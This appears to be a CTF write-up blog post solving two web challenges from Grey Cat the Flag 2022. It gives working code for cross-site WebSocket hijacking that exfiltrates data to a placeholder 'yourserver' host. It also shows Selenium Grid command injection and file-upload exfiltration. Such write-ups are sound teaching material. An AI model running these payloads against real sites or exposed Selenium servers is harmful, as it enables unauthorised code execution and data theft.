---
layout: post
title: Grey Cat the Flag 2022
---

Introduction
------

This was a CTF organised by NUS Greyhats. I competed in this CTF with [MiloTruck](https://milotruck.github.io/) and [Nyxto](https://github.com/NyxTo) as part of Team ItzyBitzySpider. I was pretty stoked for this after hearing that finals were going to take place on site. Given that our entire team having to serve NS, I was pretty satisfied with our performance. 

---

Web
------

### Quotes 

We are provided the source code for the challenge. From it, we know the following endpoints

* `/`: Serves template html file
* `/auth`: Provides some sort of authentication cookie
* `/quote`: Websocket endpoint that provides a quote
* `/share`: triggeres a bot to open a user specified URL

From the above structure, we know that we need to perform some sort of cross-site attack. Analyzing `index.html`, we see that the page is making a websocket connection at `quotes` and displaying the returned content. However, without the auth cookie only available to localhost we are unable to get the flag. 

The first part of the exploit is quite straightforward. We first need to get bot authenticated. We can do so by creating an `<iframe/>` with the `src` paramater set to `http://localhost:7070/auth`. This makes the bot visit the `/auth` endpoint getting the authentication cookie. 

```javascript
let x = document.createElement('iframe');
x.setAttribute('src', `http://localhost:7070/auth`);
document.body.appendChild(x);
```

If we host this on our server and share it with bot, it gets blocked as the application checks the following

```python
if ws.origin.startswith("http://localhost") and cookie.get('auth') == auth_token:
```

This is an insecure check any subdomain starting with localhost still works. E.g. I used `localhost.puddle.sg` 

At this stage, the bot is authenticated and can read the flag, however, we are unable to exfiltrate it without XSS or a way to bypass [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy). 

As mentioned previously, `/quote` is a websocket endpoint. I found this to be odd as this function would've worked fine with `HTTP` as well. I suspected that the exploit had something to do with websockets. With some googling, I stumbled upon the [following](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking):

> Also known as cross-origin WebSocket hijacking. It is a Cross-Site Request Forgery (CSRF) on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

This description fits the challenge perfectly. To hijack the websocket, we just create a new Websocket to the same endpoint. From the same site above, we know this works because 

> the application will handle the session in the same context as the user session. 

Before we can hijack the websocket though, we first need to make bot initate the connection. To do so, we just change the src of the `<iframe/>` we had previously created to `/` which creates a websocket connection to `/quote`. 

```javascript
// counter to prevent x.onload() from triggering itself infinitely
var counter = 1;
x.onload = () =>{
    if (counter === 1){
        x.setAttribute('src', `http://localhost:7070/`);
        document.body.appendChild(x);        
        counter = 0;
    }
}
```

After this, we can reference the provided source for our Websocket to mimic the behavior of the original. 

```javascript
websocket = new WebSocket('ws://localhost:7070/quote')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
    websocket.send("getquote");
}
function handleReply(event) {
    fetch('http://yourserver/?'+event.data)
}
```

Combining all the above, we have our final exploit. Hosting on a server with subdomain starting with localhost and sharing the url in `/share` yields us our flag. 

```html
<html>
    <script>
        let x = document.createElement('iframe');
        x.setAttribute('src', `http://localhost:7070/auth`);
        document.body.appendChild(x);
        var counter = 1;
        x.onload = () =>{
            if (counter ===1 ){
                x.setAttribute('src', `http://localhost:7070/`);
                document.body.appendChild(x);        
                counter =0;
            }
        }
        websocket = new WebSocket('ws://localhost:7070/quote')
        websocket.onopen = start
        websocket.onmessage = handleReply
        function start(event) {
            websocket.send("getquote");
        }
        function handleReply(event) {
            fetch('http://yourserver/?'+event.data)
        }
    </script>	
</html>
```

Flag: `grey{qu0735_fr0m_7h3_w153_15_w153_qu0735_7a4c6ec974b6d8b0}`

### Selnode 

Analyzing the provided dockerfile, we see that the server is running Selenium standalone server. Additionally, the root of the folder has binary that prints the flag. To get the flag, we preassumably have to find some way to execute the binary or perhaps run `strings` on it. Either way, it sounded like we needed RCE. 

Googling around for "selenium rce", I found [this post](https://nutcrackerssecurity.github.io/selenium.html) which has a nice python script to gain rce. Looks like exactly what I needed right? 

With some minor adjustments due to desired_capabilities being deprecated, the exploit script I came up with was,

```python
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

payload='/flag' 
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--utility-and-browser")
chrome_options.add_argument("--utility-cmd-prefix="+payload)

driver = webdriver.Remote(
   command_executor='http://192.168.1.130:4444/wd/hub',
   options=chrome_options
)

driver.get("https://google.com")
driver.quit()
```

Ok... but what now?  
Having never used selenium I didn't really know what to expect from the execution of the script. Clicking on the `console` hyperlink in the main page, I quickly realised that my scripts were spawning new sessions. So the script is doing something. Looking back at the blog post, I realised that my payload was working but there was no way for me to view the output (I tried searching). 

When I was doing the challenge, I was dead tired and decided to sleep after failing to get RCE. With a half conscious brain, I suddenly had the idea have selenium visit my site where I would then run some js and try to read the flag binary. If we can send the binary to ourselves, we can just execute it locally and get the flag. It was only when I woke up that I realised it should be impossible to have 0-click JS reading your file system. But what if selenium can interact with the site? 

Turns out, it can. [`LocalFileDetector`](https://www.selenium.dev/documentation/webdriver/remote_webdriver/#local-file-detector) allows us to access files and we can upload them in a form. To do so, we host a simple site using the following `html` file. 

```html
<html>
    <body>
        <form method="post" enctype="multipart/form-data">
            <input id="myfile" type="file"/>
            <input id="submit" type="submit"/>
        </form>
    </body>
</html>
```

Then, we force selenium to visit our site and upload the binary. 

```python    
from selenium import webdriver
from selenium.webdriver.common.by import By

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--utility-and-browser")

driver = webdriver.Remote(
   command_executor='http://challs.nusgreyhats.org:12323/wd/hub',
   options=chrome_options
)

from selenium.webdriver.remote.file_detector import LocalFileDetector

driver.file_detector = LocalFileDetector()
driver.get('http://yourserver.com')
driver.find_element(By.ID, 'myfile').send_keys('/flag')
driver.find_element(By.ID, 'submit').click()
driver.quit()
```

This would send a post request with the flag binary in the request body. Now all you need to do is download and run the file :)

Flag: `grey{publ1c_53l3n1um_n0d3_15_50_d4n63r0u5_8609b8f4caa2c513}`

####  Side note:
For challenges with simple payloads like this, I like to use [webhook.site](https://webhook.site). I think one lesser known feature is that you can specify the response body

![](https://i.imgur.com/Yo6PDXN.png)

This makes it super easy to spin up a remote site for CTF challenges like this. Best of all, it's completely free!!!